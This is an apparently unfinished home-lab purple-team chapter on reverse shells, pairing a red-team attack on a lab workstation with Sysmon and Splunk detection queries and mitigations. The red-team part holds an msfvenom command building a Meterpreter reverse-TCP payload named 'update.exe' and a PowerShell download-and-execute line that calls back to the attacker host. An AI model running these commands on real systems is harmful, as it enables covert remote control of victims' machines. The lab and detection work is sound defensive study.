# Chapter 2 - Reverse Shell

| Field | Detail |
| :--- | :--- |
| **ATT&CK Tactic** | Execution, Command and Control |
| **ATT&CK Technique** | T1059 (Command and Scripting Interpreter), T1071.001 (Application Layer Protocol: Web Protocols) |
| **Target(s)** | HANCORP-PC01 (192.168.50.20) |
| **Lab Date** | 2026-08-04 |
| **Last Updated** | YYYY-08-04 |

---

## Attacker Scenario

> [Standalone scenario. Something like: rather than brute forcing or
> attacking a service directly, we test how easily a malicious payload
> can be delivered and executed on an employee workstation, and whether
> the resulting outbound "call home" connection gets caught. Objective is
> to establish a remote shell back to our Kali machine and see if the
> beacon is detectable.]

---

## RED TEAM - Exploitation

### Tools Used

* msfvenom (payload generation)
* Metasploit (`exploit/multi/handler`)
* Python HTTP server (payload delivery)

### Attack Steps

**1. Generating the payload**

[Explain msfvenom command, LHOST/LPORT set to Kali, output as .exe]
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.50.100 LPORT=4444 -f exe -o update.exe
```

<p align="center">
   <img src="../images/chapter2/msfvenom-payload.png" alt="msfvenom payload generation" width="700">
</p>

**2. Setting up the listener**

[exploit/multi/handler config, matching LHOST/LPORT, set to run]

<p align="center">
   <img src="../images/chapter2/msf-handler.png" alt="Metasploit multi handler" width="700">
</p>

**3. Delivering and executing the payload on PC01**

[Host payload via Python HTTP server on Kali, pull down via PowerShell
Invoke-WebRequest on PC01, execute]
```bash
python3 -m http.server 8080
```
```powershell
Invoke-WebRequest -Uri http://192.168.50.100:8080/update.exe -OutFile C:\Users\Public\update.exe
C:\Users\Public\update.exe
```

<p align="center">
   <img src="../images/chapter2/payload-execution.png" alt="Payload execution on PC01" width="700">
</p>

**4. Catching the session**

[Meterpreter session established, note what access this grants]

<p align="center">
   <img src="../images/chapter2/meterpreter-session.png" alt="Meterpreter session caught" width="700">
</p>

---

## Defense Scenario

> [Blue team noticed unusual outbound traffic from PC01 to an unfamiliar
> internal host, or is proactively hunting for C2 beacon activity]

---

## BLUE TEAM - Detection

### Expectations

* Sysmon Event ID 1 (Process Creation) — payload executing from an
  unusual path (`C:\Users\Public\`), likely unsigned
* Sysmon Event ID 1 for `powershell.exe` with a suspicious command line
  (Invoke-WebRequest pulling an .exe from an internal IP)
* Sysmon Event ID 3 (Network Connection) — PC01 initiating an outbound
  connection to the Kali IP on the payload's port

### Splunk Logs

<p align="center">
   <img src="../images/chapter2/suspicious-sysmon.png" alt="Suspicious Sysmon events" width="700">
</p>

### Detailed Logs

**Payload execution**

**QUERY**
```spl
index=* sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="*Public*"
| table _time, Image, CommandLine, ParentImage, User
```
[Explain findings — process launching from a non-standard path, unsigned
binary, note the parent process if PowerShell delivered it]

<p align="center">
   <img src="../images/chapter2/detailed-processcreation.png" alt="Tabled process creation logs" width="700">
</p>

**Outbound beacon connection**

**QUERY**
```spl
index=* sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3 DestinationIp=192.168.50.100
| table _time, Image, DestinationIp, DestinationPort, User
```
[Explain findings — PC01 reaching out to the Kali IP on port 4444,
why outbound-initiated connections like this evade inbound firewall
rules, why this specific port/destination pairing is the giveaway]

<p align="center">
   <img src="../images/chapter2/detailed-networkconn.png" alt="Tabled network connection logs" width="700">
</p>

---

## Mitigation & Defense

* Application whitelisting to block unsigned/unknown binaries from
  executing, especially from user-writable paths like `Public` or `Temp`
* Egress filtering — restrict outbound traffic to only known-necessary
  ports/destinations instead of allowing PC01 unrestricted outbound access
* Enable PowerShell Script Block Logging (Event ID 4104) to catch
  download-and-execute behavior at the command level, not just process creation
* EDR/AV signature and behavioral detection for known payload frameworks
  (Metasploit payloads are heavily signatured by most modern AV)
* Network segmentation — standard employee workstations shouldn't have
  unrestricted reach to arbitrary internal or external hosts
* Alert on outbound connections to non-standard high ports from
  workstations that have no business making them

---

## References

* [MITRE ATT&CK T1059 - Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
* [MITRE ATT&CK T1071.001 - Application Layer Protocol: Web Protocols](https://attack.mitre.org/techniques/T1071/001/)